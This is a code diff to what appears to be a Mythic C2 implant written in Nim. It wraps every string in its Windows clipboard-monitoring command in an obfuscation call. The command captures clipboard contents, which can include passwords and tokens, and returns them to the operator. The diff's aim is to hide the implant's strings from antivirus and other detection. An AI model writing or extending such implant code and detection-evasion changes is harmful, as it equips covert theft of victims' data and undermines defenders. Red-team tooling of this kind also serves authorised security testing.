@@ -1,5 +1,6 @@
 import ../utils/mythic_responses
 import ../utils/debug
+import ../utils/strenc
 import std/[json, times, sets, os, tables]
 
 when defined(windows):
@@ -57,10 +58,10 @@ proc clipboardMonitor*(taskId: string, params: JsonNode): JsonNode =
       let args = to(params, ClipboardMonitorArgs)
       
       if args.duration < 1 or args.duration > 3600:
-        return mythicError(taskId, "Duration must be between 1 and 3600 seconds")
+        return mythicError(taskId, obf("Duration must be between 1 and 3600 seconds"))
       
       if clipboardMonitorActive:
-        return mythicError(taskId, "Clipboard monitor is already running")
+        return mythicError(taskId, obf("Clipboard monitor is already running"))
       
       debug &"[DEBUG] Starting clipboard monitor for {args.duration} seconds (non-blocking)"
       
@@ -77,7 +78,7 @@ proc clipboardMonitor*(taskId: string, params: JsonNode): JsonNode =
       let initialClip = getClipboardText()
       if initialClip.len > 0:
         clipboardMonitorState.seenClips.incl(initialClip)
-        clipboardMonitorState.output.add("=== Initial Clipboard ===\n")
+        clipboardMonitorState.output.add(obf("=== Initial Clipboard ===\n"))
         clipboardMonitorState.output.add(initialClip)
         clipboardMonitorState.output.add("\n\n")
         clipboardMonitorState.lastClip = initialClip
@@ -85,18 +86,18 @@ proc clipboardMonitor*(taskId: string, params: JsonNode): JsonNode =
       clipboardMonitorActive = true
       
       # Return processing status - agent will poll checkClipboardMonitor
-      let msg = "Clipboard monitoring started for " & $args.duration & " seconds (background task)"
+      let msg = obf("Clipboard monitoring started for ") & $args.duration & obf(" seconds (background task)")
       return %*{
-        "task_id": taskId,
-        "completed": false,
-        "status": "processing",
-        "user_output": msg
+        obf("task_id"): taskId,
+        obf("completed"): false,
+        obf("status"): obf("processing"),
+        obf("user_output"): msg
       }
       
     except Exception as e:
-      return mythicError(taskId, "Error starting clipboard monitor: " & e.msg)
+      return mythicError(taskId, obf("Error starting clipboard monitor: ") & e.msg)
   else:
-    return mythicError(taskId, "clipboard_monitor command is only available on Windows")
+    return mythicError(taskId, obf("clipboard_monitor command is only available on Windows"))
 
 proc checkClipboardMonitor*(taskId: string): JsonNode =
   ## Check clipboard monitor status and return results when complete
@@ -109,7 +110,7 @@ proc checkClipboardMonitor*(taskId: string): JsonNode =
     if currentClip.len > 0 and currentClip != clipboardMonitorState.lastClip:
       if currentClip notin clipboardMonitorState.seenClips:
         clipboardMonitorState.seenClips.incl(currentClip)
-        let output = "\n=== Clipboard Change at " & $now() & " ===\n" & currentClip & "\n"
+        let output = obf("\n=== Clipboard Change at ") & $now() & obf(" ===\n") & currentClip & "\n"
         clipboardMonitorState.output.add(output)
         clipboardMonitorState.lastClip = currentClip
         
@@ -117,10 +118,10 @@ proc checkClipboardMonitor*(taskId: string): JsonNode =
         
         # Return immediately with new clipboard data (still processing)
         return %*{
-          "task_id": taskId,
-          "completed": false,
-          "status": "processing",
-          "user_output": output
+          obf("task_id"): taskId,
+          obf("completed"): false,
+          obf("status"): obf("processing"),
+          obf("user_output"): output
         }
       clipboardMonitorState.lastClip = currentClip
     
@@ -130,9 +131,9 @@ proc checkClipboardMonitor*(taskId: string): JsonNode =
       
       var finalOutput = ""
       if clipboardMonitorState.seenClips.len == 0:
-        finalOutput = "Clipboard monitoring completed. No new clipboard changes detected."
+        finalOutput = obf("Clipboard monitoring completed. No new clipboard changes detected.")
       else:
-        finalOutput = "Clipboard monitoring completed. Total unique entries captured: " & $clipboardMonitorState.seenClips.len
+        finalOutput = obf("Clipboard monitoring completed. Total unique entries captured: ") & $clipboardMonitorState.seenClips.len
       
       debug "[DEBUG] Clipboard monitoring completed"
       
